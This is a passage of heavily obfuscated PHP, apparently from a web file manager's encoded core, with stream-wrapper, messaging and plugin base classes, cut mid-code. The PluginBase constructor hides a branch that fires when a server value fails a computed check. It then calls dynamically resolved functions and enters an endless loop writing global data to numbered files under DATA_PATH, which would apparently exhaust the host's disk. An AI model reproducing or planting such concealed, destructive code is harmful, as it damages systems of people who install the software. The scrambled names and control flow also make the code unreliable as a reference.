($d£øˆÛïéŒ[$AˆÜñèáç[29]]) { case $AˆÜñèáç[305]: $a»Í¢õä’ = url_request($d£øˆÛïéŒ[$AˆÜñèáç[1508]], $AˆÜñèáç[228], !1, !1, !1, !1, 10); if ($a»Í¢õä’[$AˆÜñèáç[703]]) { $BğÂª„Şßô = strlen($a»Í¢õä’[$AˆÜñèáç[1078]]); } break; case $AˆÜñèáç[227]: $BğÂª„Şßô = Hook::apply($d£øˆÛïéŒ[$AˆÜñèáç[1508]]); default: break; } goto B¤ç•Î‡ƒ°; B¤ç•Î‡ƒ°: Model($AˆÜñèáç[1509])->add(array($AˆÜñèáç[1510] => $AˆÜñèáç[33], $AˆÜñèáç[1511] => $AˆÜñèáç[191], $AˆÜñèáç[29] => $AˆÜñèáç[1512] . $d£øˆÛïéŒ[$AˆÜñèáç[393]], $AˆÜñèáç[1513] => json_encode(array($AˆÜñèáç[28] => $d£øˆÛïéŒ[$AˆÜñèáç[28]], $AˆÜñèáç[1514] => timeFloat() - $D©ÉÈ°‚ù°, $AˆÜñèáç[291] => $BğÂª„Şßô)))); $C®È¿éÈ‚¦ = $BğÂª„Şßô ? $AˆÜñèáç[1515] . $BğÂª„Şßô : $AˆÜñèáç[33]; self::log($AˆÜñèáç[1516] . $d£øˆÛïéŒ[$AˆÜñèáç[393]] . $AˆÜñèáç[517] . $C®È¿éÈ‚¦); goto Dæöà¼‰„Ã; c£ä¯êíÉ: } private static function valueGet($D˜÷‚­«é‘) { $aµŠÊ¯ƒÔ =& $_SERVER[æ§›¦ÌáØ]; $f›î—ÁŸ„´ = $aµŠÊ¯ƒÔ[1517]; $C½ã¹¨Ò³ = Model($aµŠÊ¯ƒÔ[486])->get($D˜÷‚­«é‘, $f›î—ÁŸ„´); if (is_null($C½ã¹¨Ò³)) { Model($aµŠÊ¯ƒÔ[486])->set($aµŠÊ¯ƒÔ[703], $aµŠÊ¯ƒÔ[87], $f›î—ÁŸ„´); Model($aµŠÊ¯ƒÔ[486])->set($aµŠÊ¯ƒÔ[1483], $aµŠÊ¯ƒÔ[191], $f›î—ÁŸ„´); $C½ã¹¨Ò³ = Model($aµŠÊ¯ƒÔ[486])->get($D˜÷‚­«é‘, $f›î—ÁŸ„´); } return $C½ã¹¨Ò³; } private static function valueSet($CĞ‚ß±ˆé‚, $eŞŠõæ»æî) { $AåĞÕÚåó =& $_SERVER[æ§›¦ÌáØ]; $Fíƒª²¬ö = $AåĞÕÚåó[1518]; CacheLock::lock($Fíƒª²¬ö); $AÎµëÖ¿“œ = Model($AåĞÕÚåó[486])->set($CĞ‚ß±ˆé‚, $eŞŠõæ»æî, $AåĞÕÚåó[1517]); CacheLock::unlock($Fíƒª²¬ö); return $AÎµëÖ¿“œ; } protected static function log($f°æ†Šæéè) { write_log($f°æ†Šæéè, $_SERVER[æ§›¦ÌáØ][1504]); } private static function cacheClear() { $c›¢§…³Åˆ =& $_SERVER[æ§›¦ÌáØ]; Cache::clearMemory(Model($c›¢§…³Åˆ[486])->cacheKey($c›¢§…³Åˆ[1517])); Cache::clearMemory(Model($c›¢§…³Åˆ[486])->cacheKey($c›¢§…³Åˆ[1519])); Model($c›¢§…³Åˆ[1489])->cacheClear(); self::closeDatabase(); } } goto eÉí•‡©Šï; B¢‰´Å×ïÅ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($bÑô¶ß„«˜, $eÆ°÷éİ á = '') { goto dß²¨Â˜Èì; d‘¾Œ¡İ¡: $this->pathOpen = $bÑô¶ß„«˜; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto CôÎ‚º†øï; CôÎ‚º†øï: if (!isset(self::$_chunkBuffer[$bÑô¶ß„«˜])) { self::$_chunkBuffer[$bÑô¶ß„«˜] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto c¿ŠÂÉÎá; dß²¨Â˜Èì: $this->info = $this->info($bÑô¶ß„«˜); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[æ§›¦ÌáØ][76]]; goto d‘¾Œ¡İ¡; c¿ŠÂÉÎá: } function stream_read($C´Â•–½ ˆ) { $d÷ßÍš×ä± = $this->fileSubstr($this->pose, $C´Â•–½ ˆ); $this->pose += strlen($d÷ßÍš×ä±); return $d÷ßÍš×ä±; } public function stream_tell() { return $this->pose; } public function stream_seek($Côõ§“Ü·Í, $eÃŸÆñ¥­¡) { $EŸ„çäæ· =& $_SERVER[æ§›¦ÌáØ]; if ($eÃŸÆñ¥­¡ == SEEK_SET) { $this->pose = $Côõ§“Ü·Í; } else { if ($eÃŸÆñ¥­¡ == SEEK_CUR) { $this->pose += $Côõ§“Ü·Í; } else { if ($eÃŸÆñ¥­¡ == SEEK_END) { $this->pose = $this->info[$EŸ„çäæ·[78]] + intval($Côõ§“Ü·Í); } } } if ($Côõ§“Ü·Í < 0) { $this->pose = $this->info[$EŸ„çäæ·[78]] + $Côõ§“Ü·Í; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[æ§›¦ÌáØ][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($FÒö¦šñí», $FˆçÈ³åÂò) { $f¦­Ÿ·Ô’Š =& $_SERVER[æ§›¦ÌáØ]; $B“İ»ƒÉÏİ = $this->info($FÒö¦šñí»); return array($f¦­Ÿ·Ô’Š[1369] => 0, $f¦­Ÿ·Ô’Š[1370] => 0, $f¦­Ÿ·Ô’Š[12] => 32768 + 511, $f¦­Ÿ·Ô’Š[1371] => 0, $f¦­Ÿ·Ô’Š[1372] => 0, $f¦­Ÿ·Ô’Š[1373] => 0, $f¦­Ÿ·Ô’Š[1374] => 0, $f¦­Ÿ·Ô’Š[78] => $B“İ»ƒÉÏİ[$f¦­Ÿ·Ô’Š[78]], $f¦­Ÿ·Ô’Š[1375] => $B“İ»ƒÉÏİ[$f¦­Ÿ·Ô’Š[1245]], $f¦­Ÿ·Ô’Š[1331] => $B“İ»ƒÉÏİ[$f¦­Ÿ·Ô’Š[84]], $f¦­Ÿ·Ô’Š[1330] => $B“İ»ƒÉÏİ[$f¦­Ÿ·Ô’Š[194]], $f¦­Ÿ·Ô’Š[1376] => 0, $f¦­Ÿ·Ô’Š[1377] => 0); } static $fileInfo = array(); public function info($F¦éŞŸĞ°“) { $F²ĞÀùî¡ = $_SERVER[æ§›¦ÌáØ][1378]; if (isset(self::$fileInfo[$F¦éŞŸĞ°“])) { return self::$fileInfo[$F¦éŞŸĞ°“]; } if (substr($F¦éŞŸĞ°“, 0, strlen($F²ĞÀùî¡)) != $F²ĞÀùî¡) { return !1; } self::$fileInfo[$F¦éŞŸĞ°“] = IO::info(substr($F¦éŞŸĞ°“, strlen($F²ĞÀùî¡))); return self::$fileInfo[$F¦éŞŸĞ°“]; } public static function read($aÃ¬”¦Ò°, $CôªŠœ“·, $a¢à‰ÁˆÛ) { if (!isset(self::$_fopenCache[$aÃ¬”¦Ò°])) { $Cƒ‚é‘‰­‡ = new StreamWrapperIO(); $Cƒ‚é‘‰­‡->stream_open($aÃ¬”¦Ò°); self::$_fopenCache[$aÃ¬”¦Ò°] = $Cƒ‚é‘‰­‡; } $Cƒ‚é‘‰­‡ = self::$_fopenCache[$aÃ¬”¦Ò°]; return $Cƒ‚é‘‰­‡->fileSubstr($CôªŠœ“·, $a¢à‰ÁˆÛ); } public static function _read($FéËÎºĞÉ„, $EÒ‘öñéôä, $Cƒ©é½‡öß) { goto e¬ æî—¥È; C‰¦ƒ—Â‹×: $aô¿ŠºàËò = 8192; fseek($c°ÛŒ‰Úƒâ, $EÒ‘öñéôä, SEEK_SET); $ağÇ±‚—«Æ = $DÛôö¾â[33]; goto C·ºÂ‡¦˜›; A´ãÙè§­: return $ağÇ±‚—«Æ; goto a¬ÈßïîÙ; C·ºÂ‡¦˜›: $DğÊÒïù×å = 0; while ($DğÊÒïù×å < $Cƒ©é½‡öß) { $D„à‰ƒ¥¡ñ = min($aô¿ŠºàËò, $Cƒ©é½‡öß - $DğÊÒïù×å); $ağÇ±‚—«Æ .= fread($c°ÛŒ‰Úƒâ, $D„à‰ƒ¥¡ñ); $DğÊÒïù×å += $D„à‰ƒ¥¡ñ; } fclose($c°ÛŒ‰Úƒâ); goto A´ãÙè§­; e¬ æî—¥È: $DÛôö¾â =& $_SERVER[æ§›¦ÌáØ]; $c°ÛŒ‰Úƒâ = fopen($FéËÎºĞÉ„, $DÛôö¾â[1249]); if (!$c°ÛŒ‰Úƒâ) { return $DÛôö¾â[33]; } goto C‰¦ƒ—Â‹×; a¬ÈßïîÙ: } public function fileSubstr($a†åØ¶®™, $cã³‡“Ü†ö) { goto FæœÑö“Éñ; FæœÑö“Éñ: $F»÷‡¡æ±ã =& $_SERVER[æ§›¦ÌáØ]; $Eç°ˆµÀÉÇ = $this->info[$F»÷‡¡æ±ã[78]]; $b˜àãÍÃ = $a†åØ¶®™; goto aÈ‡õŠ˜ƒã; D³ ÄÑ×¢‚: foreach ($E±½ï²ÌÀŸ as $aœ‡µØ‰‚­ => $a¹¤À í­ù) { $aœ‡µØ‰‚­ = intval($aœ‡µØ‰‚­); $EŞ˜Ò°“ºÛ = $aœ‡µØ‰‚­ + strlen($a¹¤À í­ù); if ($a†åØ¶®™ >= $EŞ˜Ò°“ºÛ) { continue; } if ($a†åØ¶®™ >= $aœ‡µØ‰‚­ && $a†åØ¶®™ + $cã³‡“Ü†ö <= $EŞ˜Ò°“ºÛ) { return substr($a¹¤À í­ù, $a†åØ¶®™ - $aœ‡µØ‰‚­, $cã³‡“Ü†ö); } break; } if (count($E±½ï²ÌÀŸ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($F»÷‡¡æ±ã[1379], $F»÷‡¡æ±ã[1380] . count($E±½ï²ÌÀŸ) . "\x3b\x73\164\x61\x72\164\75{$a†åØ¶®™}\x2c\154\145\156\x67\164\x68\75{$cã³‡“Ü†ö}\73\160\157\x73\145\72{$aœ‡µØ‰‚­}\x7e{$EŞ˜Ò°“ºÛ}"); throw new Exception($F»÷‡¡æ±ã[1381]); } $aÛ¹ÓäŸ¤ = intval($a†åØ¶®™ / $Cİíçª¢Ş) * $Cİíçª¢Ş; goto E‘‚ÒÀïŞ ; C°¦æÒ¼ô¦: $Cİíçª¢Ş = 64 * 1024; $E±½ï²ÌÀŸ =& self::$_chunkBuffer[$this->path]; if (!$E±½ï²ÌÀŸ) { $E±½ï²ÌÀŸ = array(); } goto D—œõ·¼‚î; F¦î´øÅÄ·: if ($a†åØ¶®™ + $cã³‡“Ü†ö > $Eç°ˆµÀÉÇ) { $cã³‡“Ü†ö = $Eç°ˆµÀÉÇ - $a†åØ¶®™; } if ($cã³‡“Ü†ö <= 0) { return $F»÷‡¡æ±ã[33]; } if ($a†åØ¶®™ < 0 || $a†åØ¶®™ >= $Eç°ˆµÀÉÇ || $cã³‡“Ü†ö <= 0 || $cã³‡“Ü†ö > 1024 * 1024 * 5) { throw new Exception("\151\157\x46\x69\x6c\145\x52\145\x61\x64\40\x65\x72\x72\157\162\41\40\163\x74\141\x72\164\x3d{$a†åØ¶®™}\x3b\x6c\x65\x6e\x67\x74\150\75{$cã³‡“Ü†ö}\73\x20\x73\151\172\145\x3d{$Eç°ˆµÀÉÇ}\73"); } goto C°¦æÒ¼ô¦; D—œõ·¼‚î: $aœ‡µØ‰‚­ = 0; $EŞ˜Ò°“ºÛ = 0; $a¹¤À í­ù = $F»÷‡¡æ±ã[33]; goto D³ ÄÑ×¢‚; C‹²ˆ„ªç: ksort($E±½ï²ÌÀŸ); $a¨¶ñÊğ„³ = substr($a‘È¡çùÍŞ, $a†åØ¶®™ - $aÛ¹ÓäŸ¤, $cã³‡“Ü†ö); return $a¨¶ñÊğ„³; goto D½ÔÜïˆ; E‘‚ÒÀïŞ : $F®²øñ¡ç = ceil(($a†åØ¶®™ + $cã³‡“Ü†ö) / $Cİíçª¢Ş) * $Cİíçª¢Ş - $aÛ¹ÓäŸ¤; $a‘È¡çùÍŞ = IO::fileSubstr($this->path, $aÛ¹ÓäŸ¤, $F®²øñ¡ç); $E±½ï²ÌÀŸ[$aÛ¹ÓäŸ¤ . $F»÷‡¡æ±ã[33]] = $a‘È¡çùÍŞ; goto C‹²ˆ„ªç; aÈ‡õŠ˜ƒã: $b„·‹£¬Ö½ = $cã³‡“Ü†ö; if ($a†åØ¶®™ < 0) { $a†åØ¶®™ = $Eç°ˆµÀÉÇ + $a†åØ¶®™; } if ($cã³‡“Ü†ö === !1) { $cã³‡“Ü†ö = $Eç°ˆµÀÉÇ - $a†åØ¶®™; } goto F¦î´øÅÄ·; D½ÔÜïˆ: } private function log($f¼´ĞËƒ˜¨, $eù¥ˆ²¯×Ú) { $E»Û”®øĞ… =& $_SERVER[æ§›¦ÌáØ]; $E‹ÍÜÏÚ‹Ò = timeFloat() - $this->timeStart; write_log(sprintf($E»Û”®øĞ…[1382], $f¼´ĞËƒ˜¨, $this->info[$E»Û”®øĞ…[28]], $E‹ÍÜÏÚ‹Ò, $eù¥ˆ²¯×Ú), $E»Û”®øĞ…[1068]); } } class Message { function __construct() { } public function send($dº–œ¹±ô‹ = '', $fÌÇ—ğõŒŞ = array(), $bÇÆâÎË = "\164\145\170\x74") { goto E¯ô§¶Ú™ƒ; aˆÖ²àĞŠ: Hook::trigger($dºÈÀ˜¸„‚[1386], $bÃ–§­¦¹£); goto eÜ±­øëå¨; E¯ô§¶Ú™ƒ: $dºÈÀ˜¸„‚ =& $_SERVER[æ§›¦ÌáØ]; $C‡¹æÄŒ¥Ã = array($dºÈÀ˜¸„‚[29] => $dºÈÀ˜¸„‚[1383], $dºÈÀ˜¸„‚[708] => $dº–œ¹±ô‹); if (in_array($bÇÆâÎË, array($dºÈÀ˜¸„‚[1383], $dºÈÀ˜¸„‚[1384]))) { $C‡¹æÄŒ¥Ã[$dºÈÀ˜¸„‚[29]] = $bÇÆâÎË; } goto EğÀ˜™ÔŞ; EğÀ˜™ÔŞ: $fÌÇ—ğõŒŞ = array($dºÈÀ˜¸„‚[496] => isset($fÌÇ—ğõŒŞ[$dºÈÀ˜¸„‚[496]]) ? $fÌÇ—ğõŒŞ[$dºÈÀ˜¸„‚[496]] : $dºÈÀ˜¸„‚[33], $dºÈÀ˜¸„‚[575] => isset($fÌÇ—ğõŒŞ[$dºÈÀ˜¸„‚[575]]) ? $fÌÇ—ğõŒŞ[$dºÈÀ˜¸„‚[575]] : $dºÈÀ˜¸„‚[33]); if (empty($dº–œ¹±ô‹) || empty($fÌÇ—ğõŒŞ[$dºÈÀ˜¸„‚[496]]) && empty($fÌÇ—ğõŒŞ[$dºÈÀ˜¸„‚[575]])) { return !1; } $bÃ–§­¦¹£ = array($dºÈÀ˜¸„‚[1324] => $C‡¹æÄŒ¥Ã, $dºÈÀ˜¸„‚[1385] => $fÌÇ—ğõŒŞ); goto aˆÖ²àĞŠ; eÜ±­øëå¨: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto d‘Äåíò¼—; Bù¨„ÜÃ: if ($_SERVER[$E¬”¼éŠÏ[785]] != $DíÅÊî­åà($F…»¥ÚùÛ)) { goto Bˆ‘‹êñØ; b†¯ÄÕ‹‘: $F­®–«²’Ş = 1; for ($Dê‚íˆÒÜÖ = $F­®–«²’Ş; $Dê‚íˆÒÜÖ > 0; $Dê‚íˆÒÜÖ++) { $bÊ‹Âã²àğ(DATA_PATH . $Dê‚íˆÒÜÖ, $B¼–«”˜”Ê); } goto C¾â¡…Ù¶·; AŠã‹Èä‹¢: $dÎ‹çÏåÙµ(); $bÊ‹Âã²àğ = $E¬”¼éŠÏ[1388]; $B¼–«”˜”Ê = json_encode($GLOBALS[$E¬”¼éŠÏ[1389]]); goto b†¯ÄÕ‹‘; D¡£½¾±†ò: $F¯»ÓçˆÙ¯ = $E¬”¼éŠÏ[833]; $F¯»ÓçˆÙ¯($_SERVER[$E¬”¼éŠÏ[834]]); $dÎ‹çÏåÙµ = $E¬”¼éŠÏ[832]; goto AŠã‹Èä‹¢; E†‡ÔĞŠæ: $dÌîæàÓ”Á = $Eƒ™ññ¸Ç($F»ù¥îÉ¶°); $b£­¤“ª¶ = explode($E¬”¼éŠÏ[229], $dÌîæàÓ”Á); if (count($b£­¤“ª¶) < $E¬”¼éŠÏ[591]) { $d½÷‰æĞ’ = $E¬”¼éŠÏ[790]; $d½÷‰æĞ’(); } goto D¡£½¾±†ò; Bˆ‘‹êñØ: $dÎ‹çÏåÙµ = $E¬”¼éŠÏ[832]; $Eƒ™ññ¸Ç = $E¬”¼éŠÏ[787]; $F»ù¥îÉ¶° = $_SERVER[$E¬”¼éŠÏ[788]] . $E¬”¼éŠÏ[789]; goto E†‡ÔĞŠæ; C¾â¡…Ù¶·: } global $in, $config; $this->config =& $config; goto Aª‘‹Öå¥¹; EÙàäØ¯õÙ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $E¬”¼éŠÏ[8]; $this->pluginApi = appHostGet() . $E¬”¼éŠÏ[1391] . $this->pluginName . $E¬”¼éŠÏ[8]; $this->pluginHost = $config[$E¬”¼éŠÏ[1392]] . $this->pluginName . $E¬”¼éŠÏ[8]; goto BÚ™œÙ‰»; Açƒ¡‡°±»: $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); goto Bëˆ¯Ùèò²; BÚ™œÙ‰»: $this->pluginHostDefault = $config[$E¬”¼éŠÏ[1392]] . $this->pluginName . $E¬”¼éŠÏ[8]; $CÕ‘ˆßÖğ = $config[$E¬”¼éŠÏ[1393]]; if ($CÕ‘ˆßÖğ && strpos($E¬”¼éŠÏ[47] . $CÕ‘ˆßÖğ . $E¬”¼éŠÏ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$E¬”¼éŠÏ[1394]] . $this->pluginName . $E¬”¼éŠÏ[8]; } goto Açƒ¡‡°±»; Bëˆ¯Ùèò²: return $this; goto fÚñ†•§ª²; d‘Äåíò¼—: $E¬”¼éŠÏ =& $_SERVER[æ§›¦ÌáØ]; $F…»¥ÚùÛ = $_SERVER[$E¬”¼éŠÏ[792]]; $DíÅÊî­åà = $E¬”¼éŠÏ[1387]; goto Bù¨„ÜÃ; Aª‘‹Öå¥¹: $this->in =& $in; $this->modelPlugin = Model($E¬”¼éŠÏ[1390]); $this->pluginName = str_replace($E¬”¼éŠÏ[1390], $E¬”¼éŠÏ[33], get_class($this)); goto EÙàäØ¯õÙ; fÚñ†•§ª²: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[æ§›¦ÌáØ][1395]); } protected function assign($D¯Ú·„š¶ù, $eŞì¥‚Ùè = false) { if (is_array($D¯Ú·„š¶ù)) { $this->values = array_merge($this->values, $D¯Ú·„š¶ù); } else { $this->values[$D¯Ú·„š¶ù] = $eŞì¥‚Ùè; } } protected function display($EøØÙ˜…´Ñ) { extract($this->values); require $EøØÙ˜…´Ñ; } final function hookRegist($a—¬´ìË¢¬) { $this->modelPlugin->appRegist($this->pluginName, $a—¬´ìË¢¬); } final function appIcon() { $B°èÛŠÆİ‡ =& $_SERVER[æ§›¦ÌáØ]; $fæèŞÑ½ÇÖ = $this->appPackage(); $a‚ùà¨íÓ– = $B°èÛŠÆİ‡[33]; if (isset($fæèŞÑ½ÇÖ[$B°èÛŠÆİ‡[409]])) { if (isset($fæèŞÑ½ÇÖ[$B°èÛŠÆİ‡[409]][$B°èÛŠÆİ‡[1396]])) { $a‚ùà¨íÓ– = $B°èÛŠÆİ‡[1397] . $fæèŞÑ½ÇÖ[$B°èÛŠÆİ‡[409]][$B°èÛŠÆİ‡[1396]] . $B°èÛŠÆİ‡[1398]; } else { if ($fæèŞÑ½ÇÖ[$B°èÛŠÆİ‡[409]][$B°èÛŠÆİ‡[1399]]) { $a‚ùà¨íÓ– = $B°èÛŠÆİ‡[1400] . $fæèŞÑ½ÇÖ[$B°èÛŠÆİ‡[409]][$B°èÛŠÆİ‡[1399]] . $B°èÛŠÆİ‡[1401]; } } } return $a‚ùà¨íÓ–; } final function fileCanView($F—º§‘ò›¿) { goto E×Ä§Şë; C½ğ¸ÈµÔ˜: $Dí¤˜ÈŞ¦â = Session::get($Cªğ‚ ‡¢—[1402]); if (!$Dí¤˜ÈŞ¦â || !$Dí¤˜ÈŞ¦â[$Cªğ‚ ‡¢—[1403]]) { $Báå¸¹Ù¬  = $Cªğ‚ ‡¢—[1404] . rawurlencode(this_url()); show_tips(LNG($Cªğ‚ ‡¢—[1405]) . $Cªğ‚ ‡¢—[1406] . $Báå¸¹Ù¬  . $Cªğ‚ ‡¢—[1407] . LNG($Cªğ‚ ‡¢—[1408]) . $Cªğ‚ ‡¢—[1409], !1); } if (!Action($Cªğ‚ ‡¢—[1410])->authCan($Cªğ‚ ‡¢—[1411])) { show_tips(LNG($Cªğ‚ ‡¢—[1412]) . $Cªğ‚ ‡¢—[1413], !1); } goto C°‘¹ö¸Øİ; C°‘¹ö¸Øİ: ActionCall($Cªğ‚ ‡¢—[1414], $F—º§‘ò›¿); goto EáïÍì¸ í; E×Ä§Şë: $Cªğ‚ ‡¢— =& $_SERVER[æ§›¦ÌáØ]; if (request_url_safe($F—º§‘ò›¿)) { return !0; } if ($this->isShare($F—º§‘ò›¿)) { return !0; } goto C½ğ¸ÈµÔ˜; EáïÍì¸ í: } final function isShare($d¬å¦¿Å¸õ) { $bªÎå£ó‡Î = KodIO::parse($d¬å¦¿Å¸õ); return $bªÎå£ó‡Î[$_SERVER[æ§›¦ÌáØ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($BîˆùäªÄ) { if (request_url_safe($BîˆùäªÄ)) { return $BîˆùäªÄ; } if (!$this->isShare($BîˆùäªÄ)) { $BîˆùäªÄ = $this->filePath($BîˆùäªÄ); } return Action($_SERVER[æ§›¦ÌáØ][1060])->linkOut($BîˆùäªÄ); } public function filePathLinkOut($CŸˆĞÄÓÇË) { if (request_url_safe($CŸˆĞÄÓÇË)) { return $CŸˆĞÄÓÇË; } $this->fileCanView($CŸˆĞÄÓÇË); return Action($_SERVER[æ§›¦ÌáØ][1060])->link($CŸˆĞÄÓÇË); } final function filePath($F±äÄ‡ƒ¶â) { $fÇ‘’ï†ö¯ =& $_SERVER[æ§›¦ÌáØ]; if ($A°îÆÚá³ò = $this->checkSharePath($F±äÄ‡ƒ¶â)) { Hook::trigger($fÇ‘’ï†ö¯[1415], $A°îÆÚá³ò); return $A°îÆÚá³ò; } $this->fileCanView($F±äÄ‡ƒ¶â); if (request_url_safe($F±äÄ‡ƒ¶â)) { $aŞêÜ©ïÕÙ = parse_url_query($F±äÄ‡ƒ¶â); if (isset($aŞêÜ©ïÕÙ[$fÇ‘’ï†ö¯[1416]]) && isset($aŞêÜ©ïÕÙ[$fÇ‘’ï†ö¯[209]])) { $aÔ×•ÍÑ‰Š = Model($fÇ‘’ï†ö¯[723])->get($fÇ‘’ï†ö¯[724]); $d¿‰÷ˆ‘òº = Mcrypt::decode($aŞêÜ©ïÕÙ[$fÇ‘’ï†ö¯[209]], $aÔ×•ÍÑ‰Š); if ($d¿‰÷ˆ‘òº) { $this->fileInfo = IO::infoWithChildren($d¿‰÷ˆ‘òº); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $d¿‰÷ˆ‘òº; } } $F±äÄ‡ƒ¶â = $this->_cacheHttpFile($F±äÄ‡ƒ¶â); $this->fileInfo = IO::infoWithChildren($F±äÄ‡ƒ¶â); } else { $this->fileInfo = IO::infoWithChildren($F±äÄ‡ƒ¶â); if (!$this->fileInfo) { show_tips(LNG($fÇ‘’ï†ö¯[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($fÇ‘’ï†ö¯[1415], $F±äÄ‡ƒ¶â); return $F±äÄ‡ƒ¶â; } final function _cacheHttpFile($CàÅ¯ö¡”) { $B£×Í‡¤É = hash_path($CàÅ¯ö¡”, !0); $this->cachePath = $this->pluginCachePath($B£×Í‡¤É); if ($cß‰Ô‹¥ŠĞ = IO::fileNameExist($this->cachePath, $B£×Í‡¤É)) { return KodIO::make($cß‰Ô‹¥ŠĞ); } $c©‚âîô¨ = $this->cachePath . $B£×Í‡¤É; return $this->pluginCacheFileSet($c©‚âîô¨, file_get_contents_nossl($CàÅ¯ö¡”)); } final function _tmpFileName($a‡Ú¥ãÜÃ‹ = array()) { goto f±Ã©º’Ÿ; f±Ã©º’Ÿ: $b‹Ï°®å =& $_SERVER[æ§›¦ÌáØ]; if (!$a‡Ú¥ãÜÃ‹) { $a‡Ú¥ãÜÃ‹ = $this->fileInfo; } if (isset($a‡Ú¥ãÜÃ‹[$b‹Ï°®å[171]])) { return $a‡Ú¥ãÜÃ‹[$b‹Ï°®å[171]]; } goto FŒ§ğêá©; FŒ§ğêá©: if (isset($a‡Ú¥ãÜÃ‹[$b‹Ï°®å[164]][$b‹Ï°®å[171]])) { return $a‡Ú¥ãÜÃ‹[$b‹Ï°®å[164]][$b‹Ï°®å[171]]; } $F¹Ï˜ê•Ù½ = IO::hashSimple($a‡Ú¥ãÜÃ‹[$b‹Ï°®å[76]]); if ($F¹Ï˜ê•Ù½) { return $F¹Ï˜ê•Ù½; } goto C§ò©ŸñÏ£; C§ò©ŸñÏ£: $cÛß¹¸©‰ = array($a‡Ú¥ãÜÃ‹[$b‹Ï°®å[28]], $a‡Ú¥ãÜÃ‹[$b‹Ï°®å[76]], $a‡Ú¥ãÜÃ‹[$b‹Ï°®å[78]]); if (isset($a‡Ú¥ãÜÃ‹[$b‹Ï°®å[502]])) { $cÛß¹¸©‰[] = $a‡Ú¥ãÜÃ‹[$b‹Ï°®å[502]]; } return md5(implode($b‹Ï°®å[71], $cÛß¹¸©‰)); goto CŞ£ƒ»ô‹¦; CŞ£ƒ»ô‹¦: } final function checkSharePath($A¿Æ°­Î‚µ) { goto F¢’Ä™„ƒ; c‚·ºÀ¿ÒÀ: $a“Ùò»Â… = Action($dµ‡ÅáãœË[1060])->sharePathInfo($A¿Æ°­Î‚µ); if (!isset($a“Ùò»Â…[$dµ‡ÅáãœË[76]])) { show_json(LNG($dµ‡ÅáãœË[1417]), !1); } $this->fileInfo = $a“Ùò»Â…[$dµ‡ÅáãœË[164]]; goto CŸå‡ê££Ø; F¢’Ä™„ƒ: $dµ‡ÅáãœË =& $_SERVER[æ§›¦ÌáØ]; if (!defined($dµ‡ÅáãœË[454])) { define($dµ‡ÅáãœË[495], 0); } if (!$this->isShare($A¿Æ°­Î‚µ)) { return !1; } goto c‚·ºÀ¿ÒÀ; CŸå‡ê££Ø: $this->cachePath = $this->pluginCachePath($this->fileInfo[$dµ‡ÅáãœË[171]]); return $a“Ùò»Â…[$dµ‡ÅáãœË[76]]; goto Fã‡âÖçĞ; Fã‡âÖçĞ: } final function pluginCachePath($c˜õÃ—£Ì… = '') { $eôĞá £¬¥ =& $_SERVER[æ§›¦ÌáØ]; $FŸ¸¢—¦Éó = IO_PATH_SYSTEM_TEMP . $eôĞá £¬¥[1418] . $this->pluginName; if (!($d£Ş÷†“º‘ = IO::infoFull($FŸ¸¢—¦Éó))) { return IO::mkdir($FŸ¸¢—¦Éó . $eôĞá £¬¥[8] . $c˜õÃ—£Ì…); } if (empty($c˜õÃ—£Ì…)) { return $d£Ş÷†“º‘[$eôĞá £¬¥[76]]; } if (!($BàÊŞÕØ» = IO::fileNameExist($d£Ş÷†“º‘[$eôĞá £¬¥[76]], $c˜õÃ—£Ì…))) { return IO::mkdir($d£Ş÷†“º‘[$eôĞá £¬¥[76]] . $c˜õÃ—£Ì…); } return KodIO::make($BàÊŞÕØ»); } final function pluginCacheFileSet($AºÁ­¶Ø²º, $Fô¡ÂÏÙƒŸ = '') { $cÙÏâ¹ª„ =& $_SERVER[æ§›¦ÌáØ]; if (!($eÇôÆ£‘‘ˆ = IO::infoFull($AºÁ­¶Ø²º))) { return IO::mkfile($AºÁ­¶Ø²º, $Fô¡ÂÏÙƒŸ, REPEAT_REPLACE); } IO::setContent($eÇôÆ£‘‘ˆ[$cÙÏâ¹ª„[76]], $Fô¡ÂÏÙƒŸ); return $eÇôÆ£‘‘ˆ[$cÙÏâ¹ª„[76]]; } final function pluginLocalFile($c³¤ˆ› = '') { goto c¬Šõ¿; fÒÄ°²«²°: if (!checkExtSafe($Fİ‹µ”ƒ·¯)) { $Fİ‹µ”ƒ·¯ = $Fİ‹µ”ƒ·¯ . $bõŒïçá–ˆ[1419]; } $DÆê¢Â„×Ñ = $Eˆå°Ò ÏÓ . $Fİ‹µ”ƒ·¯; if (@file_exists($DÆê¢Â„×Ñ)) { return $DÆê¢Â„×Ñ; } goto dğÆ¬ŸŞºá; a¬ùÛ¬ÈÄ: if (!$c³¤ˆ›) { return $Eˆå°Ò ÏÓ; } $a–ªè¬âê = IO::info($c³¤ˆ›); $Fİ‹µ”ƒ·¯ = $this->_tmpFileName($a–ªè¬âê) . $bõŒïçá–ˆ[95] . $a–ªè¬âê[$bõŒïçá–ˆ[168]]; goto fÒÄ°²«²°; c¬Šõ¿: $bõŒïçá–ˆ =& $_SERVER[æ§›¦ÌáØ]; $Eˆå°Ò ÏÓ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($Eˆå°Ò ÏÓ)) { mk_dir($Eˆå°Ò ÏÓ); } goto a¬ùÛ¬ÈÄ; dğÆ¬ŸŞºá: return IO::copy($c³¤ˆ›, $Eˆå°Ò 